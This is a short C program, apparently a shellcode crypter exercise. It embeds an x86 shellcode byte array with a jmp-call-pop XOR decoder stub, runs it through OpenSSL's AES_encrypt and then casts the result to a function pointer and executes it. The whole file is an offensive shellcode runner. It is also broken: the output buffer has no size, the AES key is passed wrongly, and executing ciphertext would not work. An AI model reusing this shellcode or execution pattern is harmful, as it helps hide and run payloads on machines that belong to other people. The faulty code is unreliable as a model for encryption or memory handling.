#include<stdio.h>
#include<string.h>
#include<openssl/aes.h>



unsigned char code[] = \
"\xeb\x16\x5e\xb1\x19\x31\xc0\xb0\xe4\x31\xd2\x8a\x16\x30\xd0\x88\x06\x88\xd0\x46\xe2\xf5\xeb\x05\xe8\xe5\xff\xff\xff\xd5\x15\x45\x2d\x02\x2d\x5e\x36\x5e\x71\x13\x7a\x14\x9d\x7e\x2e\xa7\x45\x16\x9f\x7e\xce\xc5\x08\x88";


void main()
{

	unsigned char key[] = \
	"key";
	unsigned char out[];

	AES_encrypt (code, out, key);

	printf("Encrypted Shellcode Length:  %d\n", strlen(out));

	int (*ret)() = (int(*)())out;

	ret();

}
